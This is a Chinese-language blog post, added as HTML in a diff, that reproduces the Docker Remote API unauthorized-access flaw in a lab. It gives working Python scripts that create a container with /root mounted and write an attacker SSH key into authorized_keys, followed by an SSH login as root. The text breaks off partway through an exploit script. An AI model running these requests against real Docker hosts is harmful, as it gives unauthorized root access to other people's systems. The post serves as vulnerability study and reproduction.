@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"iqiqiya.com","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.13.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="网上的文章有很多，只是复现时有些细节不清晰，本文尽可能详尽叙述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Docker Remote API 未授权访问漏洞复现">
+<meta property="og:url" content="https://iqiqiya.com/posts/4956b0d5.html">
+<meta property="og:site_name" content="iqiqiya&#39;s blog">
+<meta property="og:description" content="网上的文章有很多，只是复现时有些细节不清晰，本文尽可能详尽叙述">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://iqiqiya.com/posts/4956b0d5/image-20201110105807503.png">
+<meta property="og:image" content="https://iqiqiya.com/posts/4956b0d5/image-20201110114628898.png">
+<meta property="og:image" content="https://iqiqiya.com/posts/4956b0d5/image-20201110115908780.png">
+<meta property="og:image" content="https://iqiqiya.com/posts/4956b0d5/image-20201110124806257.png">
+<meta property="article:published_time" content="2020-11-10T02:44:05.000Z">
+<meta property="article:modified_time" content="2021-03-29T09:58:29.649Z">
+<meta property="article:author" content="iqiqiya">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="docker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://iqiqiya.com/posts/4956b0d5/image-20201110105807503.png">
+
+
+<link rel="canonical" href="https://iqiqiya.com/posts/4956b0d5.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://iqiqiya.com/posts/4956b0d5.html","path":"posts/4956b0d5.html","title":"Docker Remote API 未授权访问漏洞复现"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Docker Remote API 未授权访问漏洞复现 | iqiqiya's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">iqiqiya's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">iqiqiya的博客</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-number">1.</span> <span class="nav-text">环境配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%89%E8%A3%85Docker%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">安装Docker环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E7%8E%AF%E5%A2%83%EF%BC%9A"><span class="nav-number">1.1.1.</span> <span class="nav-text">当前环境：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%85%8D%E7%BD%AEDocker-Remote-API"><span class="nav-number">1.1.2.</span> <span class="nav-text">配置Docker Remote API</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E8%BF%90%E8%A1%8C%E7%8A%B6%E6%80%81"><span class="nav-number">1.2.</span> <span class="nav-text">查看运行状态</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="nav-number">2.</span> <span class="nav-text">复现步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E6%94%BB%E5%87%BB%E6%9C%BA%E7%94%A8%E6%88%B7%E5%85%AC%E9%92%A5"><span class="nav-number">2.1.</span> <span class="nav-text">查看攻击机用户公钥</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%AE%B9%E5%99%A8%E5%B9%B6%E8%8E%B7%E5%BE%97%E5%AE%B9%E5%99%A8ID"><span class="nav-number">2.2.</span> <span class="nav-text">创建容器并获得容器ID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E8%AF%A5%E5%AE%B9%E5%99%A8"><span class="nav-number">2.3.</span> <span class="nav-text">启动该容器</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSH%E7%99%BB%E5%BD%95"><span class="nav-number">2.4.</span> <span class="nav-text">SSH登录</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99"><span class="nav-number">3.</span> <span class="nav-text">脚本编写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E8%AE%B0%E5%BD%95"><span class="nav-number">4.</span> <span class="nav-text">问题解决记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-number">5.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="iqiqiya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">iqiqiya</p>
+  <div class="site-description" itemprop="description">喜欢的话就坚持吧！</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/iqiqiya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;iqiqiya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:iqiqiya@outlook.com" title="E-Mail → mailto:iqiqiya@outlook.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://iqiqiya.com/posts/4956b0d5.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="iqiqiya">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="iqiqiya's blog">
+      <meta itemprop="description" content="喜欢的话就坚持吧！">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Docker Remote API 未授权访问漏洞复现 | iqiqiya's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Docker Remote API 未授权访问漏洞复现
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-10 10:44:05" itemprop="dateCreated datePublished" datetime="2020-11-10T10:44:05+08:00">2020-11-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2021-03-29 17:58:29" itemprop="dateModified" datetime="2021-03-29T17:58:29+08:00">2021-03-29</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>网上的文章有很多，只是复现时有些细节不清晰，本文尽可能详尽叙述</p>
+<span id="more"></span>
+
+<p>注：利用脚本没有采用docker库，直接使用的http请求</p>
+<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h3 id="安装Docker环境"><a href="#安装Docker环境" class="headerlink" title="安装Docker环境"></a>安装Docker环境</h3><p>Docker安装按照<a target="_blank" rel="noopener" href="https://docs.docker.com/engine/install/">官方文档</a>安装就好</p>
+<h4 id="当前环境："><a href="#当前环境：" class="headerlink" title="当前环境："></a>当前环境：</h4><p>靶机：Ubuntu16.04 + Docker 19.03.13</p>
+<p>IP：172.16.180.160</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~# docker version</span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           19.03.13</span><br><span class="line"> API version:       1.40</span><br><span class="line"> Go version:        go1.13.15</span><br><span class="line"> Git commit:        4484c46d9d</span><br><span class="line"> Built:             Wed Sep 16 17:02:59 2020</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Experimental:      false</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          19.03.13</span><br><span class="line">  API version:      1.40 (minimum version 1.12)</span><br><span class="line">  Go version:       go1.13.15</span><br><span class="line">  Git commit:       4484c46d9d</span><br><span class="line">  Built:            Wed Sep 16 17:01:30 2020</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     false</span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.3.7</span><br><span class="line">  GitCommit:        8fba4e9a7d01810a393d5d25a3621dc101981175</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.0.0-rc10</span><br><span class="line">  GitCommit:        dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.18.0</span><br><span class="line">  GitCommit:        fec3683</span><br></pre></td></tr></table></figure>
+
+<p>攻击机：黑苹果（10.15.3）&#x2F;可替换为Kali + Python3.7.7</p>
+<p>IP：192.168.15.110</p>
+<h4 id="配置Docker-Remote-API"><a href="#配置Docker-Remote-API" class="headerlink" title="配置Docker Remote API"></a>配置Docker Remote API</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#备份配置文件</span></span><br><span class="line"><span class="built_in">cp</span> /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑文件添加配置ExecStart=/usr/bin/dockerd -H fd:// -H tcp://0.0.0.0:8888</span></span><br><span class="line">vim /lib/systemd/system/docker.service</span><br></pre></td></tr></table></figure>
+
+<p>如下图所示（14-15行）：</p>
+<p><img src="/posts/4956b0d5/image-20201110105807503.png" alt="image-20201110105807503"></p>
+<p>之后执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加载配置文件</span></span><br><span class="line">systemctl daemon-reload</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启docker服务</span></span><br><span class="line">systemctl restart docker.service</span><br></pre></td></tr></table></figure>
+
+<p>若无错误提示，则代表启动成功</p>
+<blockquote>
+<p>请勿在生产环境中执行上述操作！</p>
+</blockquote>
+<h3 id="查看运行状态"><a href="#查看运行状态" class="headerlink" title="查看运行状态"></a>查看运行状态</h3><p>浏览器访问：</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.180.160:8888/v1.25/images/json">http://172.16.180.160:8888/v1.25/images/json</a></p>
+<p>可获得镜像列表，如下图所示：</p>
+<p><img src="/posts/4956b0d5/image-20201110114628898.png" alt="image-20201110114628898"></p>
+<p>其他API：</p>
+<p>比如访问以下链接可以获得版本等信息</p>
+<p><a target="_blank" rel="noopener" href="http://172.16.180.160:8888/v1.25/info">http://172.16.180.160:8888/v1.25/info</a></p>
+<p><a target="_blank" rel="noopener" href="http://172.16.180.160:8888/version">http://172.16.180.160:8888/version</a></p>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>攻击者会通过发送构造的http请求执行创建容器，启动容器，删除容器等操作</p>
+<p>并且可以通过修改 &#x2F;root&#x2F;.ssh&#x2F;authorized_keys或者&#x2F;etc&#x2F;crontab计划任务获得宿主机shell</p>
+<h3 id="查看攻击机用户公钥"><a href="#查看攻击机用户公钥" class="headerlink" title="查看攻击机用户公钥"></a>查看攻击机用户公钥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /Users/iqiqiya/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4956b0d5/image-20201110115908780.png" alt="image-20201110115908780"></p>
+<h3 id="创建容器并获得容器ID"><a href="#创建容器并获得容器ID" class="headerlink" title="创建容器并获得容器ID"></a>创建容器并获得容器ID</h3><p>公钥复制到CMD那里，使用镜像alpine:latest（任意一个镜像都可以的）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/11/10</span></span><br><span class="line"><span class="comment"># @FileName  :create_container.py</span></span><br><span class="line"><span class="comment"># 创建容器并获得容器ID</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;Image&quot;</span>: <span class="string">&quot;alpine:latest&quot;</span>,</span><br><span class="line">  <span class="string">&quot;HostConfig&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Binds&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;/root/:/tmp/:rw&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;CMD&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-c&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mkdir -p /tmp/.ssh &amp;&amp; echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLfkk5aKwJuBHYS30dFNXGr6HYsstu2FNd7AJ83KYQIYkhwBagl6fQqpOwYDs2x1FsZXgyxlMx/p0zTfZFG5UHqJlbFpZH5D21vuH8bULwxyyb9JHquQOuBS0aXuqTf+6us82VG+R4GPqr2yvD5h8dT/t6U3/hMl+GAQu+OmkTHAmequ1BFawJ2E9S83IjwgRMwY1yyyLnn13KU9YPxf9yd+S2IXzizeVaTPNlzsb/c44uHk5GfH3eZFyhYfX11gqHP75RbCNvbJLtzxrgLqtlQcewwMjmOtwv2F6LP6Qdb0csaYLC8eWMsh7NiFwOwk7ls5Fqsh/kCRtRY8/XoGSb iqiqiya@iqiqiyas-MacBook-Pro.local&#x27; &gt;&gt; /tmp/.ssh/authorized_keys&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## headers中添加上content-type这个参数，指定为json格式</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## post的时候，将data字典形式的参数用json包转换成json格式</span></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;http://172.16.180.160:8888/v1.25/containers/create&#x27;</span>, headers=headers, data=json.dumps(data2))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"><span class="comment"># &#123;&quot;Id&quot;:&quot;809e116f875232b390515661a7d907f4c02a6eb084512b3bca7cf9131eba264f&quot;,&quot;Warnings&quot;:[]&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="启动该容器"><a href="#启动该容器" class="headerlink" title="启动该容器"></a>启动该容器</h3><p>上面输出的Id就是container_Id</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/11/10</span></span><br><span class="line"><span class="comment"># @FileName  :start_container.py</span></span><br><span class="line"><span class="comment"># 启动容器运行</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 请求体数据</span></span><br><span class="line">data = &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## headers中添加上content-type这个参数，指定为json格式</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">container_Id = <span class="string">&quot;809e116f875232b390515661a7d907f4c02a6eb084512b3bca7cf9131eba264f&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## post的时候，将data字典形式的参数用json包转换成json格式</span></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;http://172.16.180.160:8888/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/start&#x27;</span>, headers=headers, data=json.dumps(data))</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br><span class="line">response2 = requests.get(url=<span class="string">&#x27;http://172.16.180.160:8888/v1.25/containers/&#x27;</span>+container_Id+<span class="string">&#x27;/logs?stderr=True&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(response2.text)</span><br></pre></td></tr></table></figure>
+
+<p>返回是空的，开启成功</p>
+<h3 id="SSH登录"><a href="#SSH登录" class="headerlink" title="SSH登录"></a>SSH登录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#攻击机执行</span></span><br><span class="line">ssh 172.16.180.160</span><br><span class="line"></span><br><span class="line">输入<span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line">输入密码</span><br><span class="line"></span><br><span class="line">得到ssh会话</span><br><span class="line"></span><br><span class="line">su root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/4956b0d5/image-20201110124806257.png" alt="image-20201110124806257"></p>
+<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author    :iqiqiya</span></span><br><span class="line"><span class="comment"># @Blog      :iqiqiya.com</span></span><br><span class="line"><span class="comment"># @Time      :2020/11/10</span></span><br><span class="line"><span class="comment"># @FileName  :exp.py</span></span><br><span class="line"><span class="comment"># Docker Remote API未授权访问漏洞利用</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 要修改的参数</span></span><br><span class="line">image_name = <span class="string">&quot;alpine:latest&quot;</span></span><br><span class="line">ip = <span class="string">&quot;172.16.180.160&quot;</span></span><br><span class="line">port = <span class="string">&quot;8888&quot;</span></span><br><span class="line"><span class="comment"># 这个是公钥，也就是id_rsa.pub内容</span></span><br><span class="line">public_key = <span class="string">&quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLfkk5aKwJuBHYS30dFNXGr6HYsstu2FNd7AJ83KYQIYkhwBagl6fQqpOwYDs2x1FsZXgyxlMx/p0zTfZFG5UHqJlbFpZH5D21vuH8bULwxyyb9JHquQOuBS0aXuqTf+6us82VG+R4GPqr2yvD5h8dT/t6U3/hMl+GAQu+OmkTHAmequ1BFawJ2E9S83IjwgRMwY1yyyLnn13KU9YPxf9yd+S2IXzizeVaTPNlzsb/c44uHk5GfH3eZFyhYfX11gqHP75RbCNvbJLtzxrgLqtlQcewwMjmOtwv2F6LP6Qdb0csaYLC8eWMsh7NiFwOwk7ls5Fqsh/kCRtRY8/XoGSb iqiqiya@iqiqiyas-MacBook-Pro.local&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 